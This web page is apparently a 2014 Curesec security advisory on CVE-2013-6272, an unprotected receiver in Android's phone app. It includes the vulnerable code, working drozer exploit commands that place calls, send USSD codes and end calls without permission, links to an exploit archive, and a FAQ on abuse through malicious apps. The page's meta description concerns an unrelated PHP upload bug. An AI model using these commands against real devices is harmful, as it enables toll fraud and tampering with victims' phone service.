    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <title>CVE-2013-6272 com.android.phone - Cureblog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <meta name="description" content="When uploading a new slide image, there are no checks as to what type the uploaded image actually is. Because of this, an attacker that gained admin credentials can upload a PHP file and thus gain code execution." />
    <meta name="keywords" content="Curesec, Android, Android Security, Exploit, CVE-2013-6272, CRT-kolme, drozer, com.android.phone, PhoneGlobals" />
    <link rel="stylesheet" type="text/css" href="/blog/css/cureblog_resp.min.css" />
    <link href="/blog/feed.xml" type="application/atom+xml" rel="alternate" title="Sitewide ATOM feed" />
    <link href="/blog/rss.xml" type="application/rss+xml" rel="alternate" title="Sitewide RSS feed" />
    <link rel="icon" type="image/png" href="/blog/favicon.png" />
    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new
        Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-46012173-2', 'auto');
        ga('send', 'pageview');
    </script>
    <script type="application/ld+json">
    {
	  "@context": "http://schema.org",
	  "@type": "Organization",
	  "name": "curesec GmbH",
	  "url": "https://curesec.com",
	  "logo": "https://curesec.com/images/logo-tx.png",
	  "sameAs": "https://twitter.com/Curesec",
	  "contactPoint": [
	      {"@type": "ContactPoint", "telephone": "+49-30-52004-5222", "contactType": "customer service", "faxNumber": "+49-30-52004-5223", "email": "ping@curesec.com"}
	  ]
    }
    </script>
</head>
<body>
<header>
    <div id="logo">
	<a href="/blog/" id="textlogo" rel="nofollow">Curesec Security Research Blog</a>
        <a href="https://curesec.com" id="imglogo" rel="nofollow"><img src="/blog/images/logo-tx.png" alt="Curesec Security Enthusiasts" title="Curesec logo" /></a>	
    </div>    <div id="menu">
    <nav>
        <ul id="menuleft">
            <li><a href="/blog/" rel="nofollow">Blog</a></li>
            <li><a href="/blog/archive.html" rel="nofollow">Archive</a></li>
            <li><a href="https://curesec.com/en/unternehmen/jobs.html" rel="nofollow">Jobs</a></li>
        </ul>
    </nav>
    <ul id="menuright">
	<li><a target="_blank" href="https://twitter.com/Curesec"><img src="/blog/images/twit.png" alt="twitter" title="twitter" /></a></li>
	<li><a target="_blank" href="https://curesec.com/en/contact.html"><img src="/blog/images/contact.png" alt="contact" title="contact" /></a></li>
	<li><a href="/blog/feed.xml"><img src="/blog/images/atom-vertical.png" height="22" alt="Feed" title="atom" /></a></li>
	<li><a href="/blog/rss.xml"><img src="/blog/images/rss-vertical.png" height="22" alt="Alternative feed" title="rss" /></a></li>
    </ul>
</div>
</header>
<aside>
    <div class="heading-underline">
		<h2>Top Articles</h2>
    </div>
    	    	    <p><a href="/blog/article/blog/Tap-039n039-Sniff-185.html">Tap &#039;n&#039; Sniff </a></p>
    	    	    <p><a href="/blog/article/blog/HTTP-Strict-Transport-Security-HSTS-184.html">HTTP Strict Transport Security (HSTS)</a></p>
    	    	    <p><a href="/blog/article/blog/Advanced-Clickjacking-Attacks-181.html">Advanced Clickjacking Attacks</a></p>
    </aside>    
    <main>
        <article>
	<div class="heading-bg clearfix">

	<img src="/blog/images/uploads/default2.png" width="95" height="95" alt="CVE-2013-6272 com.android.phone" title="CVE-2013-6272 com.android.phone" />
	
	<h1>CVE-2013-6272 com.android.phone</h1>
			Date: 2014-07-04 10:20:17	</div>

	<h3>Introduction</h3>
<p>We conducted a deep investigation of android components and created some CVEs and reported bugs to the Android Security Team in late 2013. Today we want to publish one reported and one similar vulnerability.</p>
<h3>Credits</h3>
<p>Authors: Marco Lux, Pedro Umbelino<br>
Email: security@curesec.com</p>
<h3>Affectect Versions:</h3>
<table class="cvetable" style="width: 400px !important">
<tr>
<th>Version</th>
<th>SDK</th>
<th>Affected</th>
</tr>
<tr>
<td>4.1.1</td>
<td>16</td>
<td>Vulnerable</td>
</tr>
<tr>
<td>4.1.2</td>
<td>16</td>
<td>Vulnerable</td>
</tr>
<tr>
<td>4.2.2</td>
<td>17</td>
<td>Vulnerable</td>
</tr>
<tr>
<td>4.3</td>
<td>18</td>
<td>Vulnerable</td>
</tr>
<tr>
<td>4.4.2</td>
<td>19</td>
<td>Vulnerable</td>
</tr>
<tr>
<td>4.4.3</td>
<td>19</td>
<td>Not Vulnerable</td>
</tr>
<tr>
<td>4.4.4</td>
<td>19</td>
<td>Not Vulnerable</td>
</tr>
</table>
<br />
<strong>Bug: com.android.phone.PhoneGlobals$NotificationBroadcastReceiver.</strong>
<p>Browsing the code, you can get an idea about its purpose:</p>
<div class="code">
public static class NotificationBroadcastReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            // TODO: use "if (VDBG)" here.
            Log.d(LOG_TAG, "Broadcast from Notification: " + action);

            if (<span  style="background-color: #3ADF00">action.equals(ACTION_HANG_UP_ONGOING_CALL)) {</span>
                <span  style="background-color: #3ADF00">PhoneUtils.hangup(PhoneGlobals.getInstance().mCM);</span>
            } else if (<span  style="background-color: #F7FE2E">action.equals(ACTION_CALL_BACK_FROM_NOTIFICATION)</span>) {
                // Collapse the expanded notification and the notification item itself.
                closeSystemDialogs(context);
                clearMissedCallNotification(context);

                <span  style="background-color: #F7FE2E">Intent callIntent = new Intent(Intent.ACTION_CALL_PRIVILEGED, intent.getData());</span>
                callIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                        | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                context.startActivity(callIntent);
            } else if (<span  style="background-color: #FF4000">action.equals(ACTION_SEND_SMS_FROM_NOTIFICATION)</span>) {
                // Collapse the expanded notification and the notification item itself.
                closeSystemDialogs(context);
                clearMissedCallNotification(context);

                Intent smsIntent = new Intent(Intent.ACTION_SENDTO, intent.getData());
                smsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(smsIntent);
            } else {
                Log.w(LOG_TAG, "Received hang-up request from notification,"
                        + " but there's no call the system can hang up.");
            }
        }
</div>
<p>What's going on here? There are three actions that this receiver deals with:</p>
<p><span  style="background-color: #3ADF00">1) ACTION_HANG_UP_ONGOING_CALL</span> is a custom action, previously defined in this class to terminate any ongoing calls. This means that, since the receiver has no defined permissions, whatever app sends this action to this receiver can effectively terminate any outgoing call, because this package has permission to do so and the code is executed in this package context.</p>
<p><span  style="background-color: #F7FE2E">2) ACTION_CALL_BACK_FROM_NOTIFICATION</span> is also a custom action which leads to this receiver to immediately start a call using the powerful Intent.ACTION_CALL_PRIVILEGED intent. This means that any app can call any number, again without any permissions whatsoever. To notice that USSD codes can also be run, as well as calling emergency numbers and whichever action an user can do with the dial pad (except accessing android secret codes, these don't seem to run).</p>
<p><span  style="background-color: #FF4000">3) ACTION_SEND_SMS_FROM_NOTIFICATION</span> opens an SMS box to send to a chosen number. User interaction is required, so it is the least interesting.</p>
<p>Interesting programmers comment on the class:</p>
<div class="code">
  /**
     * Accepts broadcast Intents which will be prepared by {@link NotificationMgr} and thus
     * sent from framework's notification mechanism (which is outside Phone context).
     * This should be visible from outside, but shouldn't be in "exported" state.
     *
     * TODO: If possible merge this into PhoneAppBroadcastReceiver.
     */
    public static class NotificationBroadcastReceiver extends BroadcastReceiver {
</div>
<p>He explicitly says this "shouldn't be in 'exported' state" what it actually is. This allows us to exploit this issue.</p>
<p>We decided to publish this issue after we had been waiting several months for google to fix it and then went on to check out other code versions. </p>
<p>While in Version 4.1.X -  SDK 16 PhoneGlobals.java does not exist, there is a file named PhoneApp.java.</p>
<p><strong>Bug: PhoneApp.java</strong></p>
<p>PhoneApp.java also contains a NotificationBroadcastReceiver class with the exact same code plus the exact same comment: "shouldn't be in "exported" state." - right.</p>
<p>So it seems like the bug was introduced in this version and existed ever since.</p>
<p>Another feature that is provided within this component is the ability to run SS and USSD codes (those that would normally require the user to press the SEND button after the code). Android secret codes will not work nor *#06# to see the IMEI, for example.</p>
<p>For SS and USSD codes you always need to press the SEND key after entering them, so they all should work depending on your mobile provider. For manufacture defined MMI this will not work, since the code gets executed immediately with the user pressing send.</p>
<h3>Exploitation</h3>
<p>For the audience to play, test and execute the vulnerability we provide the following tools:</p>
<p>
<ul>
<li>Test application “CRT-Kolme” (includes CVE-2013-6272 and CVE-2014-N/A)</li>
<li>Exploits to use with drozer</li>
<li>Manual drozer testing commandlines</li>
</ul>
</p>
<h3>CRT-Kolme</h3>
<p>You can download “Curesec Research Team – Kolme (Callmeh)” at</p>
<p><a href="https://curesec.com/data/CRT-Kolme.apk">https://curesec.com/data/CRT-Kolme.apk</a></p>
<p>Source Code: <a href="https://curesec.com/data/CRT-Kolme.7z">https://curesec.com/data/CRT-Kolme.7z</a>
<p>After installation just click on the Curesec Logo and the testscreen will appear:</p>
<br />
<p>
<a target="_blank" href="/blog/images/90.png">
<img alt="thumbnail" src="/blog/images/thumbnails/thumbnail091.png">
</a>
</p>
<br />
<p>Choose the SDK you want to test. If your phone is vulnerable, it will call the number 31337:</p>
<br />
<p>
<a target="_blank" href="/blog/images/91.png">
<img alt="thumbnail" src="/blog/images/thumbnails/thumbnail091.png">
</a>
</p>
<br />
<h3>Drozer Exploits</h3>
<p>In this section we provide a description to exploit the CVE-2013-6272 issue provided exploits for drozer.</p>
<br />
<p>
<a target="_blank" href="/blog/images/93.png">
<img alt="thumbnail" src="/blog/images/thumbnails/thumbnail093.png">
</a>
</p>
<br />
<p>
<div class="code">
#download drozer here https://www.mwrinfosecurity.com/products/drozer/
#unpack exploits to drozer modules directory
tar xjf dz_exploits.tar.bz2 -C drozer/modules

# forward tcp and connect to drozer
adb forward tcp:31415 tcp:31415
drozer console connect

#this conducts a phone call to the specified number
dz> run curesec.exploit.callme1 -t <number to dial>

#send code to the device for instance
dz> run curesec.exploit.callme1 -c <mmi/ussd code to send>

#hangup a phone call, if there are several calls going on, one kill per call
dz> run curesec.exploit.callme1 -k kill
</div>
</p>
<br />
<p>
<a target="_blank" href="/blog/images/92.png">
<img alt="thumbnail" src="/blog/images/thumbnails/thumbnail092.png">
</a>
</p>
<br />
<h3>Drozer Commandline Foo</h3>
<p>Hangup an ongoing call or conduct a phone call:</p>
<p>
<div class="code">
#this terminates any outgoing call!
run app.broadcast.send --component com.android.phone com.android.phone.PhoneGlobals$NotificationBroadcastReceiver --action com.android.phone.ACTION_HANG_UP_ONGOING_CALL

#THIS ALLOWS YOU TO CALL ANY NUMBER!
run app.broadcast.send --component com.android.phone com.android.phone.PhoneGlobals$NotificationBroadcastReceiver --action
com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION --data-uri tel:555444111
</div>
<p>In order to make the codes work, you can use the following command:</p>
<div class="code">
run app.broadcast.send --component com.android.phone com.android.phone.PhoneGlobals$NotificationBroadcastReceiver --action com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION --data-uri tel:*%2343%23
</div>
</p>
<p>The usual # symbol for the MMI codes has to be replaced by %23 to work properly.</p>
<h3>FAQ</h3>
<strong>1. Why is this a bug?</strong>
<p>Android normally has to grant permission so that your applications can conduct actions. If your installed application does not own the right to do a phone call, the Android OS should throw a permission denied.</p>
<p>However this bug is circumventing the situation and allows any malicous app to do a phone call, send mmi or ussd codes or hangup an ongoing call.</p>
<strong>2. Is there an app to test this issue on my phone?</strong>
<p>You can use the APK we published. You will find details in the next sections. </p>
<strong>3. How would an attacker abuse this?</strong>
<p>This bug can be abused by a malicious application. Take a simple game which is coming with this code. The game wont ask you for extra permissions to do a phone call to a toll number - but it is able to do it.</p>
<p>This is normally not possible without giving the app this special permission. But not only might it be disturbing or expensive for someone to call a toll number or getting ongoing calls hung up. It is also possible to send USSD codes.</p>
<p>The list of USSD/SS/MMI codes is long and there are several quite powerful ones like changing the flow of phone calls(forwarding), blocking your simcard, enable or disable caller anonymisation and so on.</p>
<p>Please note that curesec GmbH is not responsible for any damage your device might suffer while you try to execute such codes.</p>
<strong>4. Are tools which revoke permissions from apps blocking this attack?</strong>
<p>No. As the app does not have the permission but is abusing a bug, such apps cannot easily protect you from this without the knowledge that this bug exists in another class on the system.</p>
<strong>5. How can I contact you?</strong>
<p>security@curesec.com</p>
<h3>Timeline:</h3>
<table class="cvetable" style="width: 400px !important">
<tr>
<th>Date</th>
<th>Comment</th>
<th>Sender</th>
</tr>
<tr>
<td>10/24/2013</td>
<td>Initial Report of CVE-2013-6272 by Curesec</td>
<td>Curesec</td>
</tr>
<tr>
<td>10/24/2013</td>
<td>Forwarded to the dedicated Team by Google</td>
<td>Google</td>
</tr>
<tr>
<td>11/11/2013</td>
<td>Engineers working on the issue</td>
<td>Google</td>
</tr>
<tr>
<td>17/01/2014</td>
<td>Engineers still working on the issue</td>
<td>Google</td>
</tr>
<tr>
<td>23/01/2014</td>
<td>Issue is reported to be patched and integrated the next two weeks.</td>
<td>Google</td>
</tr>
<tr>
<td>6/5/2014</td>
<td>Request if the issue is resolved now. No response yet.</td>
<td>Curesec</td>
</tr>
<tr>
<td>4/7/2014</td>
<td>Public Disclosure of CVE-2013-6272 and CVE-2014-N/A</td>
<td>Curesec</td>
</tr>

</table>



<h3>Downloads:</h3>
<a href="https://curesec.com/data/CRT-Kolme.apk"><img src="https://curesec.com/templates/curesec/img/icons/download.png" /></a><a href="https://curesec.com/data/CRT-Kolme.apk"> CRT-Kolme.apk</a> (test application)<br /> 
<a href="https://curesec.com/data/CRT-Kolme.7z"><img src="https://curesec.com/templates/curesec/img/icons/download.png" /></a><a href="https://curesec.com/data/CRT-Kolme.7z"> CRT-Kolme.7z</a> (source code)<br /> 
<a href="https://curesec.com/data/dz_exploits.tar.bz2"><img src="https://curesec.com/templates/curesec/img/icons/download.png" /></a><a href="https://curesec.com/data/dz_exploits.tar.bz2"> dz_exploit</a> (exploit archive cve-2013-6271, cve-2013-6272 and cve-2014-n/a)

	    </article>
    </main>
    <aside>
    <div class="heading-underline">
	<h2>Tag Cloud</h2>
    </div>
    <p>
    	<a href="/blog/tag/Vulnerability.html" rel="nofollow">Vulnerability&nbsp;(125)</a>&nbsp;
    	<a href="/blog/tag/Advisory.html" rel="nofollow">Advisory&nbsp;(124)</a>&nbsp;
    	<a href="/blog/tag/XSS.html" rel="nofollow">XSS&nbsp;(49)</a>&nbsp;
    	<a href="/blog/tag/Code_Execution.html" rel="nofollow">Code Execution&nbsp;(27)</a>&nbsp;
    	<a href="/blog/tag/Curesec.html" rel="nofollow">Curesec&nbsp;(23)</a>&nbsp;
    	<a href="/blog/tag/CSRF.html" rel="nofollow">CSRF&nbsp;(21)</a>&nbsp;
    	<a href="/blog/tag/SQL_Injection.html" rel="nofollow">SQL Injection&nbsp;(13)</a>&nbsp;
    	<a href="/blog/tag/Penetration_Test.html" rel="nofollow">Penetration Test&nbsp;(12)</a>&nbsp;
    	<a href="/blog/tag/Open_Redirect.html" rel="nofollow">Open Redirect&nbsp;(6)</a>&nbsp;
    	<a href="/blog/tag/ClipperCMS_1.3.0.html" rel="nofollow">ClipperCMS 1.3.0&nbsp;(5)</a>&nbsp;
    	<a href="/blog/tag/MyBB_1.8.6.html" rel="nofollow">MyBB 1.8.6&nbsp;(4)</a>&nbsp;
    	<a href="/blog/tag/Path_Traversal.html" rel="nofollow">Path Traversal&nbsp;(4)</a>&nbsp;
    	<a href="/blog/tag/Heartbleed.html" rel="nofollow">Heartbleed&nbsp;(4)</a>&nbsp;
    	<a href="/blog/tag/Blind_SQL_Injection.html" rel="nofollow">Blind SQL Injection&nbsp;(4)</a>&nbsp;
    	<a href="/blog/tag/Cross_Site_Scripting.html" rel="nofollow">Cross Site Scripting&nbsp;(4)</a>&nbsp;
        </p>
</aside>
    <aside>
    <div class="heading-underline">
    <h2>Recent Archive Entries</h2>
    </div>
    		    <h3>Apr&nbsp;2017</h3>
	    <ul class="archive-box">
	    				    		    <li><a href="/blog/article/blog/VDSL-Client-Modem-ALL-BM100VDSL2-XSS-203.html" rel="nofollow">VDSL Client Modem ALL-BM100VDSL2: XSS</a></li>
				    		    <li><a href="/blog/article/blog/VDSL-Client-Modem-ALL-BM100VDSL2-CSRF-202.html" rel="nofollow">VDSL Client Modem ALL-BM100VDSL2: CSRF</a></li>
				    		    <li><a href="/blog/article/blog/VDSL-Client-Modem-ALL-BM100VDSL2-Broken-Authentication-and-Default-Root-User-201.html" rel="nofollow">VDSL Client Modem ALL-BM100VDSL2: Broken Authentication and Default Root User</a></li>
			    	    </ul>
		    <h3>Mar&nbsp;2017</h3>
	    <ul class="archive-box">
	    				    		    <li><a href="/blog/article/blog/pfsense-232-Code-Execution-199.html" rel="nofollow">pfsense 2.3.2: Code Execution</a></li>
				    		    <li><a href="/blog/article/blog/pfsense-232-XSS-197.html" rel="nofollow">pfsense 2.3.2: XSS</a></li>
				    		    <li><a href="/blog/article/blog/pfsense-232-CSRF-198.html" rel="nofollow">pfsense 2.3.2: CSRF</a></li>
			    				    		    <li><a href="/blog/article/blog/HumHub-0201--100-beta3-Code-Execution-196.html" rel="nofollow">HumHub 0.20.1 / 1.0.0-beta.3: Code Execution</a></li>
				    		    <li><a href="/blog/article/blog/HumHub-101-XSS-195.html" rel="nofollow">HumHub 1.0.1: XSS</a></li>
			    	    </ul>
		    <h3>Feb&nbsp;2017</h3>
	    <ul class="archive-box">
	    				    		    <li><a href="/blog/article/blog/phplist-326-XSS-194.html" rel="nofollow">phplist 3.2.6: XSS</a></li>
				    		    <li><a href="/blog/article/blog/phplist-326-SQL-Injection-193.html" rel="nofollow">phplist 3.2.6: SQL Injection</a></li>
			    				    		    <li><a href="/blog/article/blog/Elefant-CMS-1312-RC-Multiple-Persistent-and-Reflected-XSS-191.html" rel="nofollow">Elefant CMS 1.3.12-RC: Multiple Persistent and Reflected XSS</a></li>
				    		    <li><a href="/blog/article/blog/Elefant-CMS-1312-RC-Open-Redirect-Host-Header-Injection-Leakage-of-Password-Hashes-190.html" rel="nofollow">Elefant CMS 1.3.12-RC: Open Redirect, Host Header Injection, Leakage of Password Hashes</a></li>
				    		    <li><a href="/blog/article/blog/Elefant-CMS-1312-RC-CSRF-189.html" rel="nofollow">Elefant CMS 1.3.12-RC: CSRF</a></li>
				    		    <li><a href="/blog/article/blog/Elefant-CMS-1312-RC-Code-Execution-188.html" rel="nofollow">Elefant CMS 1.3.12-RC: Code Execution</a></li>
			    	    </ul>
		    <h3>Jan&nbsp;2017</h3>
	    <ul class="archive-box">
	    				    		    <li><a href="/blog/article/blog/HTTP-Strict-Transport-Security-HSTS-184.html" rel="nofollow">HTTP Strict Transport Security (HSTS)</a></li>
			    				    		    <li><a href="/blog/article/blog/Plone-XSS-186.html" rel="nofollow">Plone: XSS</a></li>
			    				    		    <li><a href="/blog/article/blog/Tap-039n039-Sniff-185.html" rel="nofollow">Tap &#039;n&#039; Sniff </a></li>
			    	    </ul>
	    		    <h3>Dec&nbsp;2016</h3>
	    <ul class="archive-box">
	    				    		    <li><a href="/blog/article/blog/Content-Security-Policy-CSP-183.html" rel="nofollow">Content Security Policy (CSP)</a></li>
			    				    		    <li><a href="/blog/article/blog/Advanced-Clickjacking-Attacks-181.html" rel="nofollow">Advanced Clickjacking Attacks</a></li>
			    				    		    <li><a href="/blog/article/blog/Reading-Data-via-CSS-Injection-180.html" rel="nofollow">Reading Data via CSS Injection</a></li>
			    	    </ul>
		    <h3>Nov&nbsp;2016</h3>
	    <ul class="archive-box">
	    				    		    <li><a href="/blog/article/blog/The-HS-110-Smart-Plug-aka-Projekt-Kasa-165.html" rel="nofollow">The HS-110 Smart Plug aka Projekt Kasa</a></li>
			    				    		    <li><a href="/blog/article/blog/MyLittleForum-2361-XSS-amp-RPO-179.html" rel="nofollow"> MyLittleForum 2.3.6.1: XSS &amp; RPO</a></li>
				    		    <li><a href="/blog/article/blog/SPIP-31-XSS-amp-Host-Header-Injection-178.html" rel="nofollow">SPIP 3.1: XSS &amp; Host Header Injection</a></li>
				    		    <li><a href="/blog/article/blog/Mezzanine-420-XSS-177.html" rel="nofollow">Mezzanine 4.2.0: XSS</a></li>
				    		    <li><a href="/blog/article/blog/MyLittleForum-2361-CSRF-176.html" rel="nofollow">MyLittleForum 2.3.6.1: CSRF</a></li>
				    		    <li><a href="/blog/article/blog/MoinMoin-198-XSS-175.html" rel="nofollow">MoinMoin 1.9.8: XSS</a></li>
				    		    <li><a href="/blog/article/blog/Lepton-222-SQL-Injection-173.html" rel="nofollow">Lepton 2.2.2: SQL Injection</a></li>
				    		    <li><a href="/blog/article/blog/Lepton-222-CSRF-Open-Redirect-Insecure-Bruteforce-Protection-amp-Password-Handling-172.html" rel="nofollow">Lepton 2.2.2: CSRF, Open Redirect, Insecure Bruteforce Protection &amp; Password Handling</a></li>
				    		    <li><a href="/blog/article/blog/Lepton-222-Code-Execution-171.html" rel="nofollow">Lepton 2.2.2: Code Execution</a></li>
				    		    <li><a href="/blog/article/blog/Jaws-111-Code-Execution-170.html" rel="nofollow">Jaws 1.1.1: Code Execution</a></li>
				    		    <li><a href="/blog/article/blog/FUDforum-306-Multiple-Persistent-XSS-amp-Login-CSRF-169.html" rel="nofollow">FUDforum 3.0.6: Multiple Persistent XSS &amp; Login CSRF</a></li>
				    		    <li><a href="/blog/article/blog/Jaws-111-Object-Injection-Open-Redirect-Cookie-Flags-168.html" rel="nofollow">Jaws 1.1.1: Object Injection, Open Redirect, Cookie Flags</a></li>
				    		    <li><a href="/blog/article/blog/FUDforum-306-LFI-167.html" rel="nofollow">FUDforum 3.0.6: LFI</a></li>
			    				    		    <li><a href="/blog/article/blog/Security-Implications-of-GETPOST-Interchangeability-166.html" rel="nofollow">Security Implications of GET/POST Interchangeability</a></li>
			    	    </ul>
		    <h3>Sep&nbsp;2016</h3>
	    <ul class="archive-box">
	    				    		    <li><a href="/blog/article/blog/Peel-Shopping-802-Object-Injection-164.html" rel="nofollow">Peel Shopping 8.0.2: Object Injection</a></li>
				    		    <li><a href="/blog/article/blog/Kajona-47-XSS-amp-Directory-Traversal-163.html" rel="nofollow">Kajona 4.7: XSS &amp; Directory Traversal</a></li>
				    		    <li><a href="/blog/article/blog/MyBB-186-CSRF-Weak-Hashing-Plaintext-Passwords-161.html" rel="nofollow">MyBB 1.8.6: CSRF, Weak Hashing, Plaintext Passwords</a></li>
				    		    <li><a href="/blog/article/blog/MyBB-186-XSS-160.html" rel="nofollow">MyBB 1.8.6: XSS</a></li>
				    		    <li><a href="/blog/article/blog/MyBB-186-SQL-Injection-159.html" rel="nofollow">MyBB 1.8.6: SQL Injection</a></li>
				    		    <li><a href="/blog/article/blog/MyBB-186-Improper-validation-of-data-passed-to-eval-157.html" rel="nofollow">MyBB 1.8.6: Improper validation of data passed to eval</a></li>
				    		    <li><a href="/blog/article/blog/Oxwall-180-XSS-amp-Open-Redirect-148.html" rel="nofollow">Oxwall 1.8.0: XSS &amp; Open Redirect</a></li>
			    				    		    <li><a href="/blog/article/jobs/Penetration-Tester--Security-Consultant-mw-162.html" rel="nofollow">Penetration Tester / Security Consultant (m/w)</a></li>
			    	    </ul>
		    <h3>Mar&nbsp;2016</h3>
	    <ul class="archive-box">
	    				    		    <li><a href="/blog/article/blog/Zenphoto-1411-RFI-156.html" rel="nofollow">Zenphoto 1.4.11: RFI</a></li>
				    		    <li><a href="/blog/article/blog/PivotX-2311-Reflected-XSS-155.html" rel="nofollow">PivotX 2.3.11: Reflected XSS</a></li>
				    		    <li><a href="/blog/article/blog/PivotX-2311-Directory-Traversal-154.html" rel="nofollow">PivotX 2.3.11: Directory Traversal</a></li>
			    	    </ul>
	    </aside>

<footer>
    <ul>
        <li><a href="https://curesec.com/en/datenschutz.html" rel="nofollow">Privacy&nbsp;Policy</a></li>
        <li><a href="/blog/sitemap.xml" rel="nofollow">Sitemap</a></li>
        <li><a href="https://curesec.com/en/impressum.html" rel="nofollow">Site&nbsp;Notice</a></li>
    </ul>
    <p>Powered&nbsp;by CurePress&nbsp;1.17</p>
</footer>
</body>
</html>

